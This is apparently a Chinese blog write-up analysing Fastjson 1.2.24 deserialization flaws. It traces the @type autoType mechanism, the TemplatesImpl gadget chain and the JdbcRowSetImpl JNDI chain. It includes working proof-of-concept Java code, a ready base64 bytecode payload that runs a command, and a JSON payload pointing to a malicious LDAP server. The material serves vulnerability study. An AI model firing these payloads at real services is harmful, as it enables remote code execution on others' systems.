##### 简单的漏洞

    
    
    //Evil.java
    
    import java.io.IOException;
    
    public class Evil {
        private String name;
    
        public Evil () {
            System.out.println("构造方法");
        }
        public void setName(String name) throws IOException {
            this.name = name;
            System.out.println("调用了setName方法");
            Runtime.getRuntime().exec("calc");
        }
        public String getName() {
            System.out.println("调用了getName方法");
            return name;
        }
    }
    
    
    
    //EvilTest.java
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.JSONObject;
    
    public class EvilTest {
        public static void main(String[] args) {
            String jsonString = "{\"@type\":\"pers.fastjson.Evil\",\"name\":\"xxx\"}";
            JSONObject o = JSON.parseObject(jsonString);
            System.out.println(o);
        }
    }
    

![image-20220322225627183.png](https://image.3001.net/images/20221213/1670933643_63986c8bbc4e95a2557a2.png!small)

成功弹出了计算器

我们调式分析分析

在`JSON.parseObject`处下的断点

![image-20220322230108993.png](https://image.3001.net/images/20221213/1670933650_63986c924d318a5a2929d.png!small)

首先使用了parse()方法进行反序列化操作

![image-20220322230643348.png](https://image.3001.net/images/20221213/1670933656_63986c989c8908aa5ce2c.png!small)

在`JSON.parse(String text, int features)`创建了`DefaultJSONParser`对象

![image-20220322231145384.png](https://image.3001.net/images/20221213/1670933663_63986c9f6a9614f432c6a.png!small)

在成功创建了该对象之后通过判断`ch`是`{ / [`为token赋值，这里是12

![image-20220322231515371.png](https://image.3001.net/images/20221213/1670933671_63986ca755297e96b951a.png!small)

在`DefaultJSONParser#parse`方法中通过判断token的值，进入创建了一个`JSONObject`对象

进`parseObject`方法, 这里会通过`scanSymbol`获取到`@type`指定类,
然后通过`TypeUtils.loadClass`方法加载`Class`.

![image-20220322232601645.png](https://image.3001.net/images/20221213/1670933683_63986cb3af9632f5f577c.png!small)

![image-20220322232755509.png](https://image.3001.net/images/20221213/1670933691_63986cbbf35cb8a39724c.png!small)

先是首先在maping中寻找JDK的内置类，没有找到之后使用ClassLoader寻找，得到`clazz`的之后进行返回

创建了`ObjectDeserializer`并且调用了`getDeserializer`方法

##### Templateslmpl利用链

如果一个类中的`getter`满足调用条件而且存在可利用点，攻击链就产生了

在`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类中就存在一个私有变量`_outputProperties`，他的`getter`方法就满足在反序列化的时候的调用条件

###### 分析利用链

从漏洞触发点开始`Templateslmpl#getTransletInstance`方法

![image-20220323162758906.png](https://image.3001.net/images/20221213/1670933473_63986be1dc938e9cfc02a.png!small)

这里通过调用`_class[_transletIndex]`的`newInstance()`方法进行实例化操作，我们追踪`_class[_transletIndex]`的出处，看看是否可以控制，进行恶意操作

值得注意的是，我们想要达到漏洞点，在`getTransletInstance()`方法的两个if语句中，我们需要保证他的`_name`这个私有属性不为空，否则就直接返回了null，而不会达到漏洞点

在第二个语句中就是通过`defineTransletClasses()`方法获得了`_class`和`_transletIndex`的值，进入它

![image-20220323163657909.png](https://image.3001.net/images/20221213/1670933482_63986bea23243cf732511.png!small)

首先判断`_bytecodes`是否为空，这里的`_bytecodes`同样是`Templateslmpl`类的成员变量，可控

如果这里不为空的话，就会执行

![image-20220323164027384.png](https://image.3001.net/images/20221213/1670933488_63986bf0e59d64edfc7a6.png!small)

而且这里如果`_tfactory`不为空的话，就会导致出现异常，然后返回，不会继续执行程序，我们需要保证它不为null，虽然他也是`Templateslmpl`类的成员变量，但是他没有对应的`setter`，我们可以通过`Feature.SupportNonPublicField`来进行修改

接着走，在后面有一个for循环

![image-20220323164517134.png](https://image.3001.net/images/20221213/1670933496_63986bf86187d3716a9e3.png!small)

通过`loader.defineClass`修饰之后将`_bytecodes[i]`赋值给`_class[i]`，跟进defineClass方法

![image-20220323165008310.png](https://image.3001.net/images/20221213/1670933504_63986c0097aa74c8d8c84.png!small)

他是`ClassLoader`的`defineClass`的重写，作用是将字节码转化为Class

转回`defineTransletClasses`，在if判断语句中，如果它是main class的时候我们就为`_transletIndex`赋值

现在重新回到`getTranslateInstance()`方法，现在这里的`_class[_translateIndex]`就是我们为`_bytecodes`赋值的恶意class，我们这里将他给实例化了，成功利用恶意类

现在我们可以知道`getTranslateInstance()`是可以执行恶意类的，我们搜索在`Templateslmpl`类中什么调用了这个方法的

![image-20220323170922951.png](https://image.3001.net/images/20221213/1670933513_63986c091047a36d15ac7.png!small)

可以发现在`newTransformer()`方法中使用了getTransletInstance()方法

继续搜索在哪里调用了newTransformer()方法

![image-20220323171342990.png](https://image.3001.net/images/20221213/1670933520_63986c105d5029c6b8039.png!small)

在`getOutputProperties()`方法调用了他，而且这个方法，在反序列化的时候会被调用，现在，这个利用链就完整了

    
    
    //利用链
    getOutputProperties()
        newTransformer()
        	getTransletInstance()
        		defineTransletClasses()
        	_class[_transletIndex].newInstance()
    

###### POC

    
    
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.Feature;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import javassist.CannotCompileException;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.NotFoundException;
    import org.apache.commons.codec.binary.Base64;
    
    import java.io.IOException;
    
    public class Fj24POC {
        public static class RoboTerh {
    
        }
        public static String makeClasses() throws NotFoundException, CannotCompileException, IOException {
    
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.get(RoboTerh.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            cc.makeClassInitializer().insertBefore(cmd);
            String randomClassName = "xxx" + System.nanoTime();
            cc.setName(randomClassName);
            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
            byte[] evilCodes = cc.toBytecode();
    
            return Base64.encodeBase64String(evilCodes);
        }
    
        public static String exploitString() throws NotFoundException, CannotCompileException, IOException {
            String evilCodeBase64 = makeClasses();
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String exploit = "{'xxx':{" +
                    "\"@type\":\"" + NASTY_CLASS + "\"," +
                    "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                    "'_name':'RoboTerh'," +
                    "'_tfactory':{ }," +
                    "'_outputProperties':{ }" +
                    "}}\n";
    
            return exploit;
        }
    
        public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
            String exploit = exploitString();
            System.out.println(exploit);
            //JSON.parse(exploit, Feature.SupportNonPublicField);
            //JSON.parseObject(exploit, Feature.SupportNonPublicField);
            JSON.parseObject(exploit, Object.class, Feature.SupportNonPublicField);
        }
    }
    

![image-20220323222835313.png](https://image.3001.net/images/20221213/1670933531_63986c1bae8ffb68aa121.png!small)

    
    
    //payload
    {"xxx":{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhSb2JvVGVyaAEADElubmVyQ2xhc3NlcwEAIExwZXJzL2Zhc3Rqc29uL0ZqMjRQT0MkUm9ib1Rlcmg7AQAKU291cmNlRmlsZQEADEZqMjRQT0MuamF2YQwABAAFBwATAQAecGVycy9mYXN0anNvbi9GajI0UE9DJFJvYm9UZXJoAQAQamF2YS9sYW5nL09iamVjdAEAFXBlcnMvZmFzdGpzb24vRmoyNFBPQwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAFlJvYm9UZXJoMjY5OTQ4OTExMjAwMDABABhMUm9ib1RlcmgyNjk5NDg5MTEyMDAwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAAPAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk="],'_name':'RoboTerh','_tfactory':{ },'_outputProperties':{ }}}
    

###### 条件限制

需要开启`Feature.SupportNonPublicField`这个特性

##### JdbcRowSetImpl利用链

###### 分析利用链

`JdbcRowSetImpl`类位于`com.sun.rowset.JdbcRowSetImpl`中，它本身没有实现`Serializeble`接口，但是他是`BaseRowSet`类的子类，该类实现了该接口，所以它可以进行序列化

链子的核心触发点是`javax.naming.InitialContext#lookup`的参数可控造成的漏洞

![image-20220331184614068.png](https://image.3001.net/images/20221213/1670933542_63986c265c9b5e0326a9a.png!small)

在`JdbcRowSetImpl#setAutoCommit`中如果`this.conn`为空的时候，就会调用`this.connect`方法

![image-20220331185512853.png](https://image.3001.net/images/20221213/1670933549_63986c2d957f469b3865c.png!small)

然后在connect方法中就会调用`Javax.naming.InitialContext#lookup`方法，参数是`dataSourceName`成员变量

![image-20220331185544902.png](https://image.3001.net/images/20221213/1670933556_63986c340dc67bfdf73c3.png!small)

    
    
    //调用链
    JdbcRowSetImpl对象
        getDataSource
        	setAutocommit方法
        		context.lookup(datasourcename)
    

###### POC

    
    
    package pers.fastjson;
    
    import com.alibaba.fastjson.JSON;
    
    public class Fj24_Jdbc_POC {
        public static void main(String[] args) {
            String payload = "{" +
                    "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                    "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                    "\"autoCommit\":\"true\"," +
                    "}";
            //JSON.parseObject(payload); 成功
            //JSON.parse(payload); 成功
            JSON.parseObject(payload, Object.class);
        }
    }
    

![image-20220331183123270.png](https://image.3001.net/images/20221213/1670933576_63986c480d0b3607dbb15.png!small)

    
    
    //payload
    {"xxx":{
    	"@type":"com.sun.rowset.JdbcRowSetImpl",
    	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
    	"autoCommit":true
    }}
    

###### 条件限制

使用了JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，需要在有网的情况下执行

